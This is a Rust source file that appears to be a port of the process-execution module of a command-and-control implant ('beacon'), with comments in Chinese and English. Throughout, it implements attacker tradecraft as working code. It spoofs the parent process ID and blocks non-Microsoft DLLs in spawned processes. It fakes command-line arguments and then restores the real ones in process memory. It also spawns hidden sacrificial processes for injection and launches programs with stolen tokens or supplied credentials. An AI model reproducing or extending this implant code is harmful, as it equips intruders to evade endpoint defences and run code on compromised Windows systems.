//! 进程执行与派生（execute.cpp、spawn.cpp、process_block.cpp、
//! process_ppid.cpp、ppidfriends.cpp）。对应 process.h。
//! Process execution and spawning (execute.cpp, spawn.cpp, process_block.cpp,
//! process_ppid.cpp, ppidfriends.cpp). Mirrors process.h.

use crate::argue::{argue_restore, argue_should_spoof, ArgumentRecord};
use crate::beacon::SETTING_SPAWNTO_X64;
use crate::beacon::SETTING_SPAWNTO_X86;
use crate::callback::{post_error_d, post_error_sd};
use crate::commands::to_wide_char;
use crate::filesys::env_expand;
use crate::settings::setting_ptr;
use crate::state;
use crate::tokens::acreds;
use parking_lot::Mutex;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, ERROR_INVALID_PARAMETER, ERROR_PRIVILEGE_NOT_HELD,
};
use windows_sys::Win32::System::Diagnostics::Debug::SetErrorMode;
use windows_sys::Win32::System::Environment::GetCurrentDirectoryW;
use windows_sys::Win32::System::RemoteDesktop::ProcessIdToSessionId;
use windows_sys::Win32::System::Memory::{GetProcessHeap, HeapAlloc, HeapFree};

use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;

pub const MAX_RUNAS_CMD: usize = 16384;

pub const CREATE_SUSPENDED: u32 = 0x00000004;
pub const CREATE_NEW_CONSOLE: u32 = 0x00000010;
pub const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x00080000;

/// 扩展属性修改器（EX_ATTR_MOD）。
/// Extended attribute modifier (EX_ATTR_MOD).
#[derive(Clone, Copy, Default)]
pub struct ExAttrMod {
    pub harg: isize,
    pub parg: u64,
    pub oerr: u32,
    pub pre: Option<unsafe extern "C" fn(*mut core::ffi::c_void, i32, *mut core::ffi::c_void, *mut core::ffi::c_void) -> i32>,
    pub post: Option<unsafe extern "C" fn(*mut core::ffi::c_void)>,
}

/// 进程上下文（PROCESS_CONTEXT）。
/// Process context (PROCESS_CONTEXT).
pub struct ProcessContext {
    pub cbuffer: Vec<u8>,
    pub clen: usize,
    pub si: *mut core::ffi::c_void,
    pub pi: *mut core::ffi::c_void,
    pub flags: u32,
    pub ignore_token: bool,
}

impl Default for ProcessContext {
    fn default() -> Self {
        ProcessContext {
            cbuffer: Vec::new(),
            clen: 0,
            si: std::ptr::null_mut(),
            pi: std::ptr::null_mut(),
            flags: 0,
            ignore_token: false,
        }
    }
}

// ---- blockdlls（阻止 DLL 加载）------------------------------------
// ---- blockdlls -----------------------------------------------------------

static BLOCKDLLS: Mutex<bool> = Mutex::new(false);

pub fn blockdlls() -> bool {
    *BLOCKDLLS.lock()
}

pub fn command_blockdlls(buffer: &[u8], _length: usize) {
    let mut parser = crate::parse::DataP::init(&mut buffer.to_vec());
    let v = parser.data_int();
    *BLOCKDLLS.lock() = v != 0;
}

const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x1u64 << 44;
const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 0x00020007; // 即 ProcThreadAttributeValue(7, FALSE, TRUE, FALSE) / ProcThreadAttributeValue(7, FALSE, TRUE, FALSE)

unsafe extern "C" fn process_blockdlls_pre(
    thisp: *mut core::ffi::c_void,
    _ppid: i32,
    pattr: *mut core::ffi::c_void,
    _siptr: *mut core::ffi::c_void,
) -> i32 {
    let mods = &mut *(thisp as *mut ExAttrMod);
    mods.parg = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    let p_attribute_list = pattr as *mut core::ffi::c_void;
    if UpdateProcThreadAttribute(
        p_attribute_list,
        0,
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
        &mods.parg as *const u64 as *const core::ffi::c_void,
        std::mem::size_of::<u64>(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
    ) == 0
    {
        post_error_d(0x47, GetLastError() as i32);
        return 0;
    }
    mods.oerr = SetErrorMode(0x8001); // 错误模式标志：SEM_FAILCRITICALERRORS|SEM_NOGPFAULTERRORBOX|SEM_NOOPENFILEERRORBOX / SEM_FAILCRITICALERRORS|SEM_NOGPFAULTERRORBOX|SEM_NOOPENFILEERRORBOX
    1
}

unsafe extern "C" fn process_blockdlls_post(thisp: *mut core::ffi::c_void) {
    let mods = &mut *(thisp as *mut ExAttrMod);
    SetErrorMode(mods.oerr);
}

/// 设置阻止 DLL 加载的属性（process_blockdlls）。
/// Set the attribute to block DLLs (process_blockdlls).
pub fn process_blockdlls() -> ExAttrMod {
    ExAttrMod {
        pre: Some(process_blockdlls_pre),
        post: Some(process_blockdlls_post),
        ..Default::default()
    }
}

// ---- PPID（父进程 ID）------------------------------------
// ---- PPID ----------------------------------------------------------------

static PPID: Mutex<u32> = Mutex::new(0);

fn is_same_desktop_session(pid: u32) -> bool {
    unsafe {
        let mut ppsessid: u32 = 0;
        let mut mysessid: u32 = 0;
        if ProcessIdToSessionId(pid, &mut ppsessid) != 0
            && ProcessIdToSessionId(GetCurrentProcessId(), &mut mysessid) != 0
        {
            return ppsessid == mysessid;
        }
    }
    true
}

/// 为我们的 spawn 设置 PPID 值。
/// Set the PPID value for our spawns.
pub fn command_ppid(buffer: &[u8], _length: usize) {
    let mut parser = crate::parse::DataP::init(&mut buffer.to_vec());
    let pid = parser.data_int();
    *PPID.lock() = pid;
    if pid == 0 {
        return;
    }
    // 若用户选择使用不同的桌面会话则发出警告
    // warn the user if they opt to use a different desktop session
    if !is_same_desktop_session(pid) {
        post_error_d(0xf, pid as i32);
    }
}

unsafe extern "C" fn process_ppid_pre(
    thisp: *mut core::ffi::c_void,
    ppid: i32,
    pattr: *mut core::ffi::c_void,
    _siptr: *mut core::ffi::c_void,
) -> i32 {
    let mods = &mut *(thisp as *mut ExAttrMod);
    let h_parent_process = OpenProcess(PROCESS_CREATE_PROCESS, 0, ppid as u32);
    if h_parent_process.is_null() {
        post_error_d(0x10, GetLastError() as i32);
        return 0;
    }
    mods.harg = h_parent_process as isize;
    let p_attribute_list = pattr as *mut core::ffi::c_void;
    if UpdateProcThreadAttribute(
        p_attribute_list,
        0,
        0x00020000, // 即 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS（父进程属性）/ PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        &h_parent_process as *const HANDLE as *const core::ffi::c_void,
        std::mem::size_of::<HANDLE>(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
    ) == 0
    {
        post_error_d(0x10, GetLastError() as i32);
        return 0;
    }
    1
}

unsafe extern "C" fn process_ppid_post(thisp: *mut core::ffi::c_void) {
    let mods = &mut *(thisp as *mut ExAttrMod);
    if mods.harg != 0 {
        CloseHandle(mods.harg as HANDLE);
    }
}

/// 设置父进程属性（process_ppid）。
/// Set the parent process attribute (process_ppid).
pub fn process_ppid() -> ExAttrMod {
    ExAttrMod {
        pre: Some(process_ppid_pre),
        post: Some(process_ppid_post),
        ..Default::default()
    }
}

// ---- 属性列表辅助函数（ppidfriends.cpp）------------------------------------
// ---- attribute list helpers (ppidfriends.cpp) ----------------------------

fn attr_cleanup(ptr: *mut core::ffi::c_void) {
    unsafe {
        DeleteProcThreadAttributeList(ptr as *mut _);
        let heap = GetProcessHeap();
        HeapFree(heap, 0, ptr);
    }
}

fn attr_init(count: u32) -> *mut core::ffi::c_void {
    unsafe {
        let mut cb_attribute_list_size: usize = 0;
        InitializeProcThreadAttributeList(std::ptr::null_mut(), count, 0, &mut cb_attribute_list_size);
        let p_attribute_list = HeapAlloc(GetProcessHeap(), 0, cb_attribute_list_size);
        if p_attribute_list.is_null()
            || InitializeProcThreadAttributeList(
                p_attribute_list as *mut _,
                count,
                0,
                &mut cb_attribute_list_size,
            ) == 0
        {
            return std::ptr::null_mut();
        }
        p_attribute_list as *mut core::ffi::c_void
    }
}

fn count_proc_attributes(ppid: i32) -> u32 {
    if ppid == 0 && !blockdlls() {
        0
    } else if ppid != 0 && blockdlls() {
        2
    } else {
        1
    }
}

/// 以任意 PPID 值执行指定程序的辅助函数。
/// Helper to execute the specified program with an arbitrary PPID value.
unsafe fn _execute_program_with_ppid(ctx: &mut ProcessContext, ppid: i32) -> bool {
    let count = count_proc_attributes(ppid);

    // 没有需要修改的属性时的默认行为
    // default behavior when we have no attributes to modify
    if count == 0 {
        return execute_program(ctx);
    }

    let attrs = attr_init(count);

    let mut mod_ppid = process_ppid();
    let mut mod_blockdlls = process_blockdlls();

    // 依次执行我们的属性修改（pre）
    // walk our attribute modifications
    if ppid != 0 {
        if let Some(pre) = mod_ppid.pre {
            if pre(&mut mod_ppid as *mut _ as *mut core::ffi::c_void, ppid, attrs, ctx.si) == 0 {
                attr_cleanup(attrs);
                return false;
            }
        }
    }
    if blockdlls() {
        if let Some(pre) = mod_blockdlls.pre {
            if pre(&mut mod_blockdlls as *mut _ as *mut core::ffi::c_void, ppid, attrs, ctx.si) == 0 {
                attr_cleanup(attrs);
                return false;
            }
        }
    }

    // 配置我们的值以使用扩展启动信息（extended startup info）
    // setup our values to use an extended startup info
    let mut si_ex: STARTUPINFOEXA = std::mem::zeroed();
    si_ex.StartupInfo = *(ctx.si as *const STARTUPINFOA);
    si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXA>() as u32;
    si_ex.lpAttributeList = attrs as *mut _;

    // 更新上下文，使其指向 si_ex
    // update context to point to si_ex
    ctx.si = &mut si_ex as *mut STARTUPINFOEXA as *mut core::ffi::c_void;
    ctx.flags |= EXTENDED_STARTUPINFO_PRESENT;

    let result = execute_program(ctx);

    // 依次执行属性修改并做清理（post）
    // walk our attribute modifications and do cleanup
    if ppid != 0 {
        if let Some(post) = mod_ppid.post {
            post(&mut mod_ppid as *mut _ as *mut core::ffi::c_void);
        }
    }
    if blockdlls() {
        if let Some(post) = mod_blockdlls.post {
            post(&mut mod_blockdlls as *mut _ as *mut core::ffi::c_void);
        }
    }

    attr_cleanup(attrs);
    result
}

/// 以任意 PPID 执行程序（execute_program_with_ppid）。
/// Execute a program with an arbitrary PPID (execute_program_with_ppid).
pub fn execute_program_with_ppid(
    cbuffer: &[u8],
    clen: usize,
    si: *mut core::ffi::c_void,
    pi: *mut core::ffi::c_void,
    flags: u32,
    ignore_token: bool,
    ppid: i32,
) -> bool {
    let mut context = ProcessContext {
        cbuffer: cbuffer.to_vec(),
        clen,
        si,
        pi,
        flags,
        ignore_token,
    };
    unsafe { _execute_program_with_ppid(&mut context, ppid) }
}

/// 以默认 PPID 执行程序（execute_program_with_default_ppid）。
/// Execute a program with the default PPID (execute_program_with_default_ppid).
pub fn execute_program_with_default_ppid(
    cbuffer: &[u8],
    clen: usize,
    si: *mut core::ffi::c_void,
    pi: *mut core::ffi::c_void,
    flags: u32,
    ignore_token: bool,
) -> bool {
    let ppid = *PPID.lock() as i32;
    execute_program_with_ppid(cbuffer, clen, si, pi, flags, ignore_token, ppid)
}

// ---- execute.cpp（进程执行）------------------------------------
// ---- execute.cpp ---------------------------------------------------------

fn post_error_fmt(error: i32, fmt: std::fmt::Arguments<'_>) {
    let mut buff = String::new();
    use std::fmt::Write as _;
    let _ = buff.write_fmt(fmt);
    crate::callback::post_error_sd(error, buff.as_bytes(), unsafe { GetLastError() } as i32);
}

/// 使用备用凭据执行程序。
/// Execute a program with alternate credentials.
unsafe fn execute_program_with_creds(ctx: &mut ProcessContext, wcmdline: &[u16], p_wcwd: Option<&[u16]>) -> bool {
    let creds = acreds();
    let result = CreateProcessWithLogonW(
        creds.user.as_ptr(),
        creds.domain.as_ptr(),
        creds.password.as_ptr(),
        LOGON_NETCREDENTIALS_ONLY,
        std::ptr::null(),
        wcmdline.as_ptr() as *mut _,
        ctx.flags,
        std::ptr::null(),
        p_wcwd.map(|s| s.as_ptr()).unwrap_or(std::ptr::null()),
        ctx.si as *const _,
        ctx.pi as *mut _,
    );
    if result != 0 {
        return true;
    }
    // （省略了仅 x86 的 sysnative 处理；本移植版本面向 x64。）
    // (x86-only sysnative handling omitted; the port targets x64.)
    post_error_sd(0x045, &ctx.cbuffer, GetLastError() as i32);
    false
}

unsafe fn execute_program_with_token(ctx: &mut ProcessContext) -> bool {
    let mut wcmdline = [0u16; 1024];
    let mut wcwd = [0u16; 1024];
    let mut p_wcwd: *const u16 = std::ptr::null();

    (*(ctx.si as *mut STARTUPINFOA)).lpDesktop = std::ptr::null_mut();

    // 将 cbuffer 转换为 wcmdline
    // convert cbuffer to wcmdline
    if !to_wide_char(&ctx.cbuffer, &mut wcmdline, 1024) {
        post_error_d(0x7, ctx.clen as i32);
        return false;
    }

    // 取得当前工作目录
    // figure out the current working directory
    let size = GetCurrentDirectoryW(0, std::ptr::null_mut());
    if (size as usize) < 1024 {
        GetCurrentDirectoryW(1024, wcwd.as_mut_ptr());
        p_wcwd = wcwd.as_ptr();
    }

    // 回退到 CreateProcessWithTokenW
    // fall back to CreateProcessWithTokenW
    if CreateProcessWithTokenW(
        state::atoken() as HANDLE,
        LOGON_NETCREDENTIALS_ONLY,
        std::ptr::null(),
        wcmdline.as_ptr() as *mut _,
        ctx.flags,
        std::ptr::null(),
        p_wcwd,
        ctx.si as *const _,
        ctx.pi as *mut _,
    ) != 0
    {
        return true;
    } else if GetLastError() == ERROR_PRIVILEGE_NOT_HELD && acreds().active {
        return execute_program_with_creds(ctx, &wcmdline, if p_wcwd.is_null() { None } else { Some(std::slice::from_raw_parts(p_wcwd, 1024)) });
    } else if GetLastError() == ERROR_INVALID_PARAMETER {
        post_error_sd(0x4a, &ctx.cbuffer, GetLastError() as i32);
        return false;
    }

    post_error_sd(0x29, &ctx.cbuffer, GetLastError() as i32);
    false
}

unsafe fn _execute_program(ctx: &mut ProcessContext) -> bool {
    // 我们持有令牌，希望用它来创建进程。
    // We have a token that we want to create the process with.
    if state::atoken() != 0 && !ctx.ignore_token {
        // 创建我们的进程
        // create our process
        if CreateProcessAsUserA(
            state::atoken() as HANDLE,
            std::ptr::null(),
            ctx.cbuffer.as_ptr() as *mut _,
            std::ptr::null(),
            std::ptr::null(),
            1,
            ctx.flags,
            std::ptr::null(),
            std::ptr::null(),
            ctx.si as *const _,
            ctx.pi as *mut _,
        ) != 0
        {
            return true;
        } else if GetLastError() == ERROR_PRIVILEGE_NOT_HELD {
            return execute_program_with_token(ctx);
        }
        post_error_sd(0x29, &ctx.cbuffer, GetLastError() as i32);
        return false;
    }
    // 请用常规方式创建进程
    // create the process the normal way plz
    else if CreateProcessA(
        std::ptr::null(),
        ctx.cbuffer.as_ptr() as *mut _,
        std::ptr::null(),
        std::ptr::null(),
        1,
        ctx.flags,
        std::ptr::null(),
        std::ptr::null(),
        ctx.si as *const _,
        ctx.pi as *mut _,
    ) == 0
    {
        post_error_sd(0x30, &ctx.cbuffer, GetLastError() as i32);
        return false;
    } else {
        return true;
    }
}

/// 执行程序（execute_program）。
/// Execute a program (execute_program).
pub fn execute_program(ctx: &mut ProcessContext) -> bool {
    unsafe {
        let mut record: ArgumentRecord = Default::default();
        if (ctx.flags & CREATE_SUSPENDED) != CREATE_SUSPENDED
            && argue_should_spoof(&ctx.cbuffer, &mut record)
        {
            // 更新我们的上下文
            // update our context
            ctx.cbuffer = record.fakeargs.clone();
            ctx.flags |= CREATE_SUSPENDED;

            // 以挂起状态执行我们的程序
            // execute our program in a suspended state
            let result = _execute_program(ctx);

            // 通过修改 PEB 恢复其参数
            // restore its arguments by mucking with the PEB
            if !argue_restore(ctx.pi as *mut _, &record) {
                TerminateProcess((*(ctx.pi as *mut PROCESS_INFORMATION)).hProcess, 0);
                return false;
            } else {
                ResumeThread((*(ctx.pi as *mut PROCESS_INFORMATION)).hThread);
            }
            return result;
        } else {
            // 一切照常执行
            // execute everything as normal
            return _execute_program(ctx);
        }
    }
}

/// 所有这些参数均为 1024 字节（runas）。
/// All of these args are 1024 bytes (runas).
pub fn runas(
    domain: &[u8],
    user: &[u8],
    pass: &[u8],
    cmdline: &[u8],
    flags: u32,
    piptr: *mut core::ffi::c_void,
) -> bool {
    let mut wcmdline = vec![0u16; MAX_RUNAS_CMD];
    let mut wdomain = vec![0u16; 1024];
    let mut wuser = vec![0u16; 1024];
    let mut wpass = vec![0u16; 1024];
    let mut wcwd = vec![0u16; 1024];
    let mut p_wcwd: *const u16 = std::ptr::null();

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

    unsafe {
        // 进一步处理我们的启动信息数据结构
        // further process our startup info data structure
        GetStartupInfoW(&mut si);
        si.dwFlags = 0x00000100 | 0x00000001;
        si.wShowWindow = SW_HIDE as u16;
        si.hStdOutput = std::ptr::null_mut();
        si.hStdError = std::ptr::null_mut();
        si.hStdInput = std::ptr::null_mut();
        si.lpDesktop = std::ptr::null_mut();
    }

    // 将一些参数转换为宽字符变量
    // convert some parameters to their wide char vars
    to_wide_char(cmdline, &mut wcmdline, MAX_RUNAS_CMD);
    to_wide_char(user, &mut wuser, 1024);
    to_wide_char(pass, &mut wpass, 1024);
    to_wide_char(domain, &mut wdomain, 1024);

    // 取得当前工作目录
    // figure out the current working directory
    let size = unsafe { GetCurrentDirectoryW(0, std::ptr::null_mut()) };
    if (size as usize) < 1024 {
        unsafe { GetCurrentDirectoryW(1024, wcwd.as_mut_ptr()) };
        p_wcwd = wcwd.as_ptr();
    }

    // 尝试执行该操作
    // try to execute the action
    let result = unsafe {
        CreateProcessWithLogonW(
            wuser.as_ptr(),
            wdomain.as_ptr(),
            wpass.as_ptr(),
            LOGON_WITH_PROFILE,
            std::ptr::null(),
            wcmdline.as_ptr() as *mut _,
            CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW | flags,
            std::ptr::null(),
            p_wcwd,
            &si as *const STARTUPINFOW as *const _,
            piptr as *mut _,
        )
    };
    if result != 0 {
        return true;
    } else {
        let err = unsafe { GetLastError() } as i32;
        post_error_fmt(0x35, format_args!("{} as {}\\{}: {}", String::from_utf8_lossy(cmdline), String::from_utf8_lossy(domain), String::from_utf8_lossy(user), err));
        return false;
    }
}

// ---- spawn.cpp（进程派生）------------------------------------
// ---- spawn.cpp -----------------------------------------------------------

static SPAWN_X86: Mutex<Vec<u8>> = Mutex::new(Vec::new());
static SPAWN_X64: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// 定义我们 spawn 到的目标（command_spawnproc）。
/// Define where we will spawn to (command_spawnproc).
pub fn command_spawnproc(buffer: &[u8], length: usize, x86: bool) {
    let mut sx86 = SPAWN_X86.lock();
    let mut sx64 = SPAWN_X64.lock();

    // 重置两者
    // reset both of them
    if length == 0 || length > 256 {
        sx86.clear();
        sx64.clear();
    } else if x86 {
        sx86.clear();
        sx86.extend_from_slice(&buffer[..length]);
    } else {
        sx64.clear();
        sx64.extend_from_slice(&buffer[..length]);
    }
}

/// 解析我们的 spawnproc。
/// Resolve our spawnproc.
fn spawnproc(dst: &mut [u8], x86: bool) {
    let mut temp = vec![0u8; 256];

    // 获取我们架构对应的 spawn 值
    // grab the right spawn value for our architecture
    if x86 {
        let sx86 = SPAWN_X86.lock();
        if !sx86.is_empty() {
            temp[..sx86.len()].copy_from_slice(&sx86[..]);
        } else if let Some(spawn) = setting_ptr(SETTING_SPAWNTO_X86) {
            let n = spawn.len().min(255);
            temp[..n].copy_from_slice(&spawn[..n]);
        }
    } else {
        let sx64 = SPAWN_X64.lock();
        if !sx64.is_empty() {
            temp[..sx64.len()].copy_from_slice(&sx64[..]);
        } else if let Some(spawn) = setting_ptr(SETTING_SPAWNTO_X64) {
            let n = spawn.len().min(255);
            temp[..n].copy_from_slice(&spawn[..n]);
        }
    }

    // 需要把环境变量展开到 dst
    // need to resolve environment variables into dst
    let tlen = temp.iter().position(|&c| c == 0).unwrap_or(temp.len());
    env_expand(&temp[..tlen], dst, dst.len() as u32);
}

/// 填充 spawn 命令的通用机制（spawn_populate）。
/// Generic mechanism to populate our spawn command (spawn_populate).
pub fn spawn_populate(x86: bool, cmdbuff: &mut [u8]) {
    cmdbuff.fill(0);
    spawnproc(cmdbuff, x86);
    // （省略了仅 x86 的 sysnative/syswow64 修正；本移植版本面向 x64。）
    // (x86-only sysnative/syswow64 fixups omitted; port targets x64.)
}

/// 派生我们的临时进程（spawn_patsy）。
/// Spawn our temporary process (spawn_patsy).
pub fn spawn_patsy(
    x86: bool,
    ignore_token: bool,
    si: *mut core::ffi::c_void,
    pi: *mut core::ffi::c_void,
) -> bool {
    let mut cmdbuff = [0u8; 256];
    spawn_populate(x86, &mut cmdbuff);
    let clen = cmdbuff.iter().position(|&c| c == 0).unwrap_or(256);
    execute_program_with_default_ppid(&cmdbuff, clen, si, pi, CREATE_SUSPENDED, ignore_token)
}

/// 以另一个用户身份派生我们的临时进程（spawn_patsy_as）。
/// Spawn our temporary process as another user (spawn_patsy_as).
pub fn spawn_patsy_as(
    x86: bool,
    domain: &[u8],
    user: &[u8],
    pass: &[u8],
    pi: *mut core::ffi::c_void,
) -> bool {
    let mut cmdbuff = [0u8; 256];
    spawn_populate(x86, &mut cmdbuff);
    let clen = cmdbuff.iter().position(|&c| c == 0).unwrap_or(256);
    runas(domain, user, pass, &cmdbuff[..clen], CREATE_SUSPENDED, pi)
}

/// 用于 spawn_patsy_u 的派生+注入（spawn_patsy_u）。
/// Spawn+inject for spawn_patsy_u (spawn_patsy_u).
pub fn spawn_patsy_u(
    x86: bool,
    ignore_token: bool,
    si: *mut core::ffi::c_void,
    pi: *mut core::ffi::c_void,
    ppid: u32,
) -> bool {
    let mut cmdbuff = [0u8; 256];
    spawn_populate(x86, &mut cmdbuff);
    let clen = cmdbuff.iter().position(|&c| c == 0).unwrap_or(256);
    execute_program_with_ppid(&cmdbuff, clen, si, pi, CREATE_SUSPENDED, ignore_token, ppid as i32)
}
